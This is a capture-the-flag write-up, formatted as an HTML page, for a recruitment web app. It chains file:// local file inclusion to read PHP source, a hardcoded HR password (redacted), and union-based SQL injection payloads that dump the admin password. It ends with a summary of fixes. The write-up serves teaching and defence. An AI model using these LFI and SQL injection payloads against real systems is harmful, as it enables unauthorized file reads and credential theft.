@@ -1,0 +1,237 @@
+
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=IBM+Plex+Mono:ital,wght@0,400;0,600;1,400&display=swap');
+
+:root{
+  --bg:#0a0a0a;--surface:#111;--border:#1e1e1e;
+  --accent:#00ff88;--accent2:#ff3c3c;--accent3:#ffcc00;
+  --text:#d4d4d4;--muted:#666;--heading:#f0f0f0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'IBM Plex Mono',monospace;font-size:15px;line-height:1.85;overflow-x:hidden}
+body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);pointer-events:none;z-index:100}
+header{border-bottom:1px solid var(--border);padding:1rem 2rem;display:flex;align-items:center;gap:1.5rem;background:rgba(10,10,10,0.95);backdrop-filter:blur(8px)}
+.logo{font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--accent);letter-spacing:0.2em;text-transform:uppercase}
+.logo span{color:var(--accent2)}
+.header-meta{margin-left:auto;font-size:0.7rem;color:var(--muted);letter-spacing:0.05em}
+.blink{animation:blink 1.2s step-end infinite;color:var(--accent)}
+@keyframes blink{50%{opacity:0}}
+main{max-width:720px;margin:0 auto;padding:4rem 2rem 6rem}
+.tag-row{display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:2rem}
+.tag{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:0.15em;text-transform:uppercase;padding:0.2rem 0.6rem;border:1px solid}
+.tag-red{border-color:var(--accent2);color:var(--accent2)}
+.tag-green{border-color:var(--accent);color:var(--accent)}
+.tag-yellow{border-color:var(--accent3);color:var(--accent3)}
+h1{font-family:'Syne',sans-serif;font-size:clamp(1.8rem,5vw,3rem);font-weight:800;line-height:1.1;color:var(--heading);margin-bottom:1.5rem}
+h1 em{font-style:normal;color:var(--accent2)}
+.byline{font-size:0.72rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;border-left:2px solid var(--accent);padding-left:0.75rem;margin-bottom:3rem}
+.lead{font-size:1rem;color:var(--heading);line-height:1.9;margin-bottom:2.5rem}
+.terminal-block{background:#0d0d0d;border:1px solid var(--border);border-left:3px solid var(--accent);padding:1.2rem 1.5rem;margin:2.5rem 0;font-family:'Share Tech Mono',monospace;font-size:0.82rem;color:var(--accent);position:relative;overflow-x:auto}
+.terminal-label{position:absolute;top:-0.6rem;left:1rem;font-size:0.6rem;background:var(--bg);padding:0 0.4rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase}
+.prompt{color:var(--muted)}.cmd{color:#fff}.out{color:var(--accent3)}.err{color:var(--accent2)}
+h2{font-family:'Syne',sans-serif;font-size:1.4rem;font-weight:700;color:var(--heading);margin:3rem 0 0.75rem;display:flex;align-items:center;gap:0.6rem}
+h2::before{content:'//';color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:1rem}
+p{margin-bottom:1.4rem;color:var(--text)}
+.highlight{background:rgba(0,255,136,0.07);border-left:3px solid var(--accent);padding:1rem 1.2rem;margin:2rem 0;font-size:0.92rem}
+.highlight.red{background:rgba(255,60,60,0.06);border-color:var(--accent2)}
+.highlight.yellow{background:rgba(255,204,0,0.06);border-color:var(--accent3)}
+.checklist{list-style:none;margin:1.2rem 0 2rem;padding:0}
+.checklist li{padding:0.4rem 0 0.4rem 1.6rem;position:relative;font-size:0.9rem;color:var(--text)}
+.checklist li::before{content:'▸';position:absolute;left:0;color:var(--accent);font-family:'Share Tech Mono',monospace}
+.step-grid{margin:2rem 0}
+.step{display:grid;grid-template-columns:36px 1fr;gap:12px;margin-bottom:1.6rem;align-items:start}
+.step-num{width:36px;height:36px;border:1px solid var(--accent);display:flex;align-items:center;justify-content:center;font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--accent);flex-shrink:0}
+.step-label{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px}
+.vuln-block{background:#0d0d0d;border:1px solid var(--accent2);padding:1.2rem 1.5rem;margin:1rem 0;position:relative}
+.vuln-title{font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--accent2);letter-spacing:0.12em;text-transform:uppercase;margin-bottom:0.5rem}
+.vuln-block p{font-size:0.88rem;color:var(--text);margin-bottom:0.5rem}
+.fix{font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--accent);margin-top:6px}
+.fix::before{content:'[FIX] '}
+.redacted{background:var(--accent2);color:var(--accent2);border-radius:2px;user-select:none;padding:0 3px;cursor:help;transition:opacity 0.2s}
+.redacted:hover{opacity:0.7}
+.divider{border:none;border-top:1px solid var(--border);margin:3rem 0}
+code{font-family:'Share Tech Mono',monospace;font-size:0.8rem;color:var(--accent);background:#0d0d0d;border:1px solid var(--border);padding:1px 6px}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+</style>
+
+<div style="background:var(--bg);min-height:100vh">
+
+<header>
+  <div class="logo">RECRUIT<span>·</span>CTF</div>
+  <div class="header-meta">WRITEUP · FULL CHAIN &nbsp;<span class="blink">█</span></div>
+</header>
+
+<main>
+
+  <div class="tag-row">
+    <span class="tag tag-red">SSRF</span>
+    <span class="tag tag-red">LFI</span>
+    <span class="tag tag-yellow">HARDCODED CREDS</span>
+    <span class="tag tag-green">UNION SQLi</span>
+    <span class="tag tag-green">2x FLAGS</span>
+  </div>
+
+  <h1>Recruit Got <em>Owned</em>:<br>A Full Chain CTF Breakdown</h1>
+
+  <div class="byline">CTF Writeup &nbsp;·&nbsp; 4 min read &nbsp;·&nbsp; Web Exploitation</div>
+
+  <p class="lead">
+    The attacker didn't brute-force anything. They read source code through a misconfigured file fetcher, found plaintext credentials, and pivoted through SQL injection to extract the admin password. Three vulnerabilities, two flags, one clean chain.
+  </p>
+
+  <div class="terminal-block">
+    <span class="terminal-label">attack chain · reconstructed</span>
+    <div><span class="prompt">$</span> <span class="cmd">trace_attack --target recruit-app</span></div>
+    <div><span class="out">[1] /file.php?cv= → file:// scheme accepted → LFI</span></div>
+    <div><span class="out">[2] api.php source read → HR password EXPOSED</span></div>
+    <div><span class="out">[3] dashboard.php → unsanitized search param → SQLi</span></div>
+    <div><span class="out">[4] UNION injection → admin password DUMPED</span></div>
+    <div><span class="err">[✓] /user.txt CAPTURED · /admin.txt CAPTURED</span></div>
+  </div>
+
+  <h2>The Attack Surface</h2>
+  <p>
+    The landing page FAQ reveals a CV fetch endpoint at <code>/file.php?cv=&lt;URL&gt;</code>. HTTP and HTTPS URLs are described as supported. A footer link to <code>api.php</code> becomes a critical pivot point. The filter blocks external URLs — but only checks that the value starts with <code>file://</code>.
+  </p>
+
+  <h2>Phase 1 — Source Enumeration via LFI</h2>
+
+  <div class="step-grid">
+    <div class="step">
+      <div class="step-num">01</div>
+      <div>
+        <div class="step-label">Read the fetcher source</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">GET</span> <span class="cmd">/file.php?cv=file:///var/www/html/file.php</span>
+        </div>
+        <p style="font-size:0.88rem">Filter confirmed: must start with <code>file://</code>, path resolved via <code>realpath()</code>, restricted to <code>/var/www/html</code>. Directory traversal blocked. Scope limited to webroot.</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">02</div>
+      <div>
+        <div class="step-label">api.php — hardcoded credential found</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">GET</span> <span class="cmd">/file.php?cv=file:///var/www/html/api.php</span><br>
+          <span class="out">$HR_PASSWORD = '<span class="redacted" title="redacted">██████████████</span>';</span>
+        </div>
+        <p style="font-size:0.88rem">Plaintext HR password stored directly in PHP config. Labeled "temporary for initial rollout" — the classic antipattern that never gets cleaned up.</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">03</div>
+      <div>
+        <div class="step-label">login.php — auth flow analysis</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">GET</span> <span class="cmd">/file.php?cv=file:///var/www/html/login.php</span>
+        </div>
+        <p style="font-size:0.88rem">HR login: direct string compare against <code>$HR_PASSWORD</code>, username <code>hr</code>. Admin login: prepared statement hits DB — password not in source.</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">04</div>
+      <div>
+        <div class="step-label">dashboard.php — flag logic + SQLi identified</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">GET</span> <span class="cmd">/file.php?cv=file:///var/www/html/dashboard.php</span><br>
+          <span class="out">$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";</span>
+        </div>
+        <p style="font-size:0.88rem">Role-based flag serving: <code>hr</code> → <code>/user.txt</code> · <code>admin</code> → <code>/admin.txt</code>. Unsanitized <code>$search</code> interpolated directly into raw MySQL query.</p>
+      </div>
+    </div>
+  </div>
+
+  <h2>Phase 2 — HR Flag</h2>
+  <p>Login using the recovered credential from <code>api.php</code>:</p>
+  <div class="terminal-block">
+    <span class="terminal-label">login</span>
+    <div><span class="prompt">#</span> <span class="cmd">username: hr &nbsp;|&nbsp; password: <span class="redacted" title="redacted">████████████</span></span></div>
+    <div><span class="out">[✓] Session role = hr → /user.txt rendered on dashboard</span></div>
+  </div>
+
+  <div class="highlight" style="margin-top:1rem">
+    <strong style="color:var(--accent)">FLAG 1 CAPTURED</strong> — contents of <code>/user.txt</code> displayed directly on the dashboard.
+  </div>
+
+  <h2>Phase 3 — Union-Based SQL Injection</h2>
+
+  <p>The vulnerable query in <code>dashboard.php</code>:</p>
+  <div class="terminal-block">
+    <span class="terminal-label">vulnerable code</span>
+    <div><span class="out">"SELECT * FROM candidates WHERE name LIKE '%$search%'"</span></div>
+  </div>
+
+  <div class="step-grid">
+    <div class="step">
+      <div class="step-num">01</div>
+      <div>
+        <div class="step-label">Column count — ORDER BY probe</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">payload</span> <span class="cmd">' ORDER BY 4-- -</span><br>
+          <span class="out">[✓] No error → 4 columns confirmed (id, name, position, status)</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">02</div>
+      <div>
+        <div class="step-label">Exfiltrate admin password via UNION</div>
+        <div class="terminal-block" style="margin:0.5rem 0">
+          <span class="prompt">payload</span> <span class="cmd">' UNION SELECT 1,password,3,4 FROM users WHERE username='admin'-- -</span><br>
+          <span class="out">Name column output: <span class="redacted" title="redacted">█████████████</span></span>
+        </div>
+        <p style="font-size:0.88rem">Admin password exfiltrated and rendered in the Name column of the results table.</p>
+      </div>
+    </div>
+  </div>
+
+  <h2>Phase 4 — Admin Flag</h2>
+  <div class="terminal-block">
+    <span class="terminal-label">login</span>
+    <div><span class="prompt">#</span> <span class="cmd">username: admin &nbsp;|&nbsp; password: <span class="redacted" title="redacted">█████████████</span></span></div>
+    <div><span class="out">[✓] Session role = admin → /admin.txt rendered on dashboard</span></div>
+  </div>
+
+  <div class="highlight" style="margin-top:1rem">
+    <strong style="color:var(--accent)">FLAG 2 CAPTURED</strong> — contents of <code>/admin.txt</code> displayed directly on the dashboard.
+  </div>
+
+  <hr class="divider">
+
+  <h2>Vulnerability Summary</h2>
+
+  <div class="vuln-block">
+    <div class="vuln-title">[01] SSRF / LFI via file:// scheme</div>
+    <p>The CV fetch endpoint accepted the <code>file://</code> scheme with no restriction, enabling arbitrary local file reads within <code>/var/www/html</code>. No external URL validation present.</p>
+    <div class="fix">Allowlist trusted external domains only. Block <code>file://</code>, <code>gopher://</code>, and all non-HTTP schemes at the protocol level.</div>
+  </div>
+
+  <div class="vuln-block">
+    <div class="vuln-title">[02] Hardcoded credentials in source</div>
+    <p>Plaintext HR password stored in <code>api.php</code>, readable via the LFI. Intended as "temporary" — a common antipattern that persists indefinitely.</p>
+    <div class="fix">Use environment variables or a secrets manager. Never commit credentials to source files.</div>
+  </div>
+
+  <div class="vuln-block">
+    <div class="vuln-title">[03] Union-based SQL injection</div>
+    <p>The <code>search</code> GET parameter interpolated directly into a raw MySQL query. Enabled full table enumeration and credential extraction.</p>
+    <div class="fix">Use prepared statements with parameterized queries for all user-supplied input. Never interpolate raw strings into SQL.</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="highlight">
+    <strong style="color:var(--accent)">The Chain Lesson:</strong> No single bug broke this app. It was the combination — LFI gave source, source gave creds, creds gave login, login gave SQLi context, SQLi gave escalation. Patch one link and the chain breaks.
+  </div>
+
+  <p style="color:var(--muted);font-size:0.88rem;margin-top:2rem">
+    Stay paranoid. Read source when you can. Rotate secrets when they leak. And always check the footer links.
+  </p>
+
+</main>
+</div>
